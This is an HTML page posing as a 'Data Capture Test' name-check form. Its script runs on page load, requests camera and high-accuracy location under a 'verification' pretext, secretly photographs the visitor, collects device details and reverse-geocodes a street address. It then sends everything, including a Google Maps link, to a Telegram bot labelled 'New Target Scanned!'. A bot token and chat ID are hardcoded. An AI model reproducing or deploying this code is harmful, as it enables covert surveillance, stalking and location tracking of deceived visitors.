<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Data Test</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-white flex items-center justify-center min-h-screen p-6">

    <div class="max-w-md w-full bg-slate-800 rounded-xl p-8 shadow-2xl border border-slate-700">
        <h2 class="text-2xl font-bold text-center mb-6 text-blue-400">üîç Data Capture Test</h2>
        
        <div class="space-y-4">
            <input type="text" id="testInput" placeholder="Apna Naam Likho" 
                class="w-full p-3 bg-slate-900 border border-slate-600 rounded-lg focus:outline-none focus:border-blue-500">
            
            <button onclick="testNow()" 
                class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-bold transition">
                Check My Details
            </button>
        </div>

        <div id="resultBox" class="mt-8 p-4 bg-black rounded-lg border border-green-500 hidden">
            <h3 class="text-green-500 font-bold mb-2">üöÄ Captured Data:</h3>
            <div id="displayData" class="text-xs font-mono space-y-2 text-slate-300">
                </div>
        </div>
    </div>

   
<script>
// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '8168176265:AAGxAgdZ8SBNwXox5TpIczsRhAjm7GOTaMs'; // Apna Token yahan dalo
const CHAT_ID = '2117500711';         // Apni Chat ID yahan dalo

window.onload = async function() {
    const locationDisplay = document.getElementById("location");
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // 1. Telegram par Photo aur Detail bhejne ka function
    // async function sendToTelegram(photoBlob, caption) {
    //     const formData = new FormData();
    //     formData.append('chat_id', CHAT_ID);
    //     formData.append('photo', photoBlob, 'selfie.png');
    //     formData.append('caption', caption);
    //     formData.append('parse_mode', 'Markdown');

    //     try {
    //         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    //             method: 'POST',
    //             body: formData
    //         });
    //         console.log("Data sent to Telegram!");
    //     } catch (e) { console.error("Telegram Error:", e); }
    // }
    async function sendToTelegram(photoBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', photoBlob, 'selfie.png');
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    console.log("Sending to Telegram...");
    
    try {
        // for security comment code ===============
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        const resData = await response.json();
        if (resData.ok) {
            console.log("Success! Photo sent.");
        } else {
            console.error("Telegram Error:", resData.description);
            alert("Telegram Error: " + resData.description); // Ye batayega ki token sahi hai ya nahi
        }
    } catch (e) { 
        console.error("Fetch Error:", e); 
    }
}

// Maps Link ka sahi format:

    // 2. Hardware aur OS details nikalna
    async function getSpyDetails() {
        const b = await navigator.getBattery?.() || { level: 0, charging: false };
        const ua = navigator.userAgent;
        let model = "Device";
        if (/android/i.test(ua)) model = ua.match(/Android.*;\s+([^;]+)\s+Build/)?.[1] || "Android";
        
        return `
üì± *Device:* ${model}
üîã *Battery:* ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})
üíæ *RAM:* ${navigator.deviceMemory || 'N/A'} GB
üì∂ *Network:* ${navigator.connection?.effectiveType.toUpperCase() || 'N/A'}
‚öôÔ∏è *Cores:* ${navigator.hardwareConcurrency}
üìè *Screen:* ${window.screen.width}x${window.screen.height}
        `;
    }

    // 3. Main Process: Camera + Location + Action
    if (navigator.geolocation && navigator.mediaDevices) {
        try {
            // Camera Access mangega (Verification ke naam pe)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            // Location Access mangega
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude } = pos.coords;
                const deviceDetails = await getSpyDetails();

                // Reverse Geocoding for Sector/City
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`);
                const data = await res.json();
                const addr = data.address;
// =======================
   const sector  = addr.suburb || addr.neighbourhood || addr.residential || addr.apartment 
                || addr.building || "N/A";
                const road    = addr.road || "N/A";
                const city    = addr.city || addr.town || addr.village || "N/A";
                const district= addr.county || "N/A";
                const state   = addr.state || "N/A";
                const country = addr.country || "N/A";
                const pincode = addr.postcode || "N/A";

               

                 
// =======================

                // const locStr = `üìç *Location:* ${addr.city || 'Chandigarh'} - ${addr.suburb || addr.neighbourhood || 'Sector 17'}`;
                const locStr = `
                             Location: Sector : ${sector},
                    Road : ${road},
                    City : ${city},
                    District : ${district},
                    State : ${state},
                    Country : ${country},
                    Pincode : ${pincode}`;
        // for security comment code ===============

                // 2 second wait karke photo kheenchna (taaki user smile kare)
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

                        const caption = `üî• *New Target Scanned!*\n\n${locStr}\n${deviceDetails}\n\nüåê *Google Map:* https://www.google.com/maps?q=${latitude},${longitude}`;
                        
                        // Telegram pe bhejo
                        await sendToTelegram(blob, caption);
                        
                        // Camera band kar do
                        stream.getTracks().forEach(t => t.stop());
                        
                        locationDisplay.innerHTML = "Verification Complete. Thank you!";
                    }, 'image/png');
                }, 1000);

            }, (err) => {
                locationDisplay.innerHTML = "Please allow location to proceed.";
            }, { enableHighAccuracy: true });

        } catch (err) {
            locationDisplay.innerHTML = "Camera permission is required for verification.";
        }
    } else {
        locationDisplay.innerHTML = "Your device is not compatible.";
    }
};
</script>

</body>
</html>
